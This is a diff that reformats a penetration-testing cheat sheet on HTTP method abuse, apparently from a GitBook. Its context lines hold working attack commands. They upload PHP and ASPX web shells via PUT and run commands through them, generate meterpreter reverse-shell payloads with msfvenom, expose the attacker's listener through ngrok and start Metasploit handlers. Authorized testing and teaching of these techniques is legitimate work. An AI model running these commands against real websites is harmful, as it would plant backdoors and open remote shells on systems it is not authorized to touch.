@@ -2,10 +2,10 @@
 
 ## Check List
 
-* [ ] _Enumerate supported HTTP methods._
-* [ ] _Test for access control bypass._
-* [ ] _Test XST vulnerabilities._
-* [ ] _Test HTTP method overriding techniques._
+* [ ] Enumerate supported HTTP methods.
+* [ ] Test for access control bypass.
+* [ ] Test XST vulnerabilities.
+* [ ] Test HTTP method overriding techniques.
 
 ## Cheat Sheet
 
@@ -13,13 +13,17 @@
 
 #### [cURL](https://curl.se/)
 
-_Check Methods_
+{% hint style="info" %}
+Check Methods
+{% endhint %}
 
 ```bash
 curl -X OPTIONS -I $WEBSITE
 ```
 
-_Upload phpinfo()_
+{% hint style="info" %}
+Upload phpinfo()
+{% endhint %}
 
 ```bash
 curl -X PUT -d "<?php phpinfo(); ?>" $WEBSITE/phpinfo.php
@@ -35,13 +39,17 @@ nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
 
 #### [Weevely](https://github.com/epinna/weevely3)
 
-_Create Web Shell PHP_
+{% hint style="info" %}
+Create Web Shell PHP
+{% endhint %}
 
 ```bash
 weevely generate 00980098 /tmp/unk9vvn.php
 ```
 
-_Create Web Shell ASPX_
+{% hint style="info" %}
+Create Web Shell ASPX
+{% endhint %}
 
 ```bash
 cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
@@ -49,20 +57,26 @@ cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
 
 #### [cURL](https://curl.se/)
 
-_Upload Web Shell PHP_
+{% hint style="info" %}
+Upload Web Shell PHP
+{% endhint %}
 
 <pre class="language-bash"><code class="lang-bash">curl -X PUT $WEBSITE/uploads/index.php \
 <strong>     --upload-file /tmp/unk9vvn.php \
 </strong>     -H "Content-Type: application/x-php"
 </code></pre>
 
-_Execute Web Shell PHP_
+{% hint style="info" %}
+Execute Web Shell PHP
+{% endhint %}
 
 ```bash
 weevely "$WEBSITE/uploads/index.php" 00980098
 ```
 
-_Upload Web Shell ASP_
+{% hint style="info" %}
+Upload Web Shell ASP
+{% endhint %}
 
 ```bash
 curl -X PUT $WEBSITE/uploads/index.aspx \
@@ -70,7 +84,9 @@ curl -X PUT $WEBSITE/uploads/index.aspx \
      -H "Content-Type: application/x-aspx"
 ```
 
-_Execute Web Shell ASP_
+{% hint style="info" %}
+Execute Web Shell ASP
+{% endhint %}
 
 ```bash
 curl "$WEBSITE/uploads/index.aspx?cmd=whoami"
@@ -78,7 +94,9 @@ curl "$WEBSITE/uploads/index.aspx?cmd=whoami"
 
 #### [Metasploit](https://www.metasploit.com/)
 
-_All Methods Scan_
+{% hint style="info" %}
+All Methods Scan
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -89,7 +107,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_PUT Method Scan_
+{% hint style="info" %}
+PUT Method Scan
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -101,13 +121,17 @@ msfconsole -qx "
     run -j"
 ```
 
-_Start Ngrok_
+{% hint style="info" %}
+Start Ngrok
+{% endhint %}
 
 ```bash
 nohup ngrok tcp 4444 >/dev/null 2>&1 &
 ```
 
-_Define ENV Ngrok_
+{% hint style="info" %}
+Define ENV Ngrok
+{% endhint %}
 
 ```bash
 NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
@@ -115,7 +139,9 @@ NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
 NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
 ```
 
-_Cert Spoof_
+{% hint style="info" %}
+Cert Spoof
+{% endhint %}
 
 ```bash
 rm -rf /home/$USER/.msf4/loot/*
@@ -126,7 +152,9 @@ msfconsole -qx "
     exit"
 ```
 
-_Post-EXP_
+{% hint style="info" %}
+Post-EXP
+{% endhint %}
 
 ```bash
 cat > /tmp/post-exp.rc << EOF
@@ -145,7 +173,9 @@ bg
 EOF
 ```
 
-_Generate Web shell PHP_
+{% hint style="info" %}
+Generate Web shell PHP
+{% endhint %}
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp \
@@ -159,7 +189,9 @@ sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
 sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
 ```
 
-_Generate Web Shell ASP_
+{% hint style="info" %}
+Generate Web Shell ASP
+{% endhint %}
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_winhttps \
@@ -169,7 +201,9 @@ msfvenom -p windows/meterpreter/reverse_winhttps \
          -f asp > /tmp/unk9vvn.aspx
 ```
 
-_Listening Metasploit PHP_
+{% hint style="info" %}
+Listening Metasploit PHP
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -184,7 +218,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Listening Metaploit ASP_
+{% hint style="info" %}
+Listening Metaploit ASP
+{% endhint %}
 
 ```bash
 msfconsole -qx "
@@ -199,7 +235,9 @@ msfconsole -qx "
     run -j"
 ```
 
-_Upload Shell PUT Method PHP_
+{% hint style="info" %}
+Upload Shell PUT Method PHP
+{% endhint %}
 
 ```bash
 curl -X PUT $WEBSITE/wp-content/uploads/index.php \
@@ -211,7 +249,9 @@ curl -X PUT $WEBSITE/wp-content/uploads/index.php \
 
 #### [Katana](https://github.com/projectdiscovery/katana) & [FFUF](https://github.com/ffuf/ffuf)
 
-_Create Script_
+{% hint style="info" %}
+Create Script
+{% endhint %}
 
 ```bash
 sudo nano http-methods-fuzzer.sh
@@ -306,7 +346,9 @@ ffuf -w "$URLS_FILE":URL \
      "${HEADER_PARAMS[@]}"
 ```
 
-_Run Script_
+{% hint style="info" %}
+Run Script
+{% endhint %}
 
 ```bash
 sudo chmod +x http-methods-fuzzer.sh;sudo ./http-methods-fuzzer.sh $WEBSITE
@@ -329,7 +371,9 @@ ffuf -w /tmp/urls.txt:URL \
 
 #### [FFUF](https://github.com/ffuf/ffuf)
 
-_X-HTTP-Method_
+{% hint style="info" %}
+X-HTTP-Method
+{% endhint %}
 
 ```bash
 echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
@@ -342,7 +386,9 @@ ffuf -w /tmp/methods.txt:METHODS \
      -r -c -mc 200
 ```
 
-_X-HTTP-Method-Override_
+{% hint style="info" %}
+X-HTTP-Method-Override
+{% endhint %}
 
 ```bash
 echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
@@ -355,7 +401,9 @@ ffuf -w /tmp/methods.txt:METHODS \
      -r -c -mc 200
 ```
 
-_X-Method-Override_
+{% hint style="info" %}
+X-Method-Override
+{% endhint %}
 
 ```bash
 echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
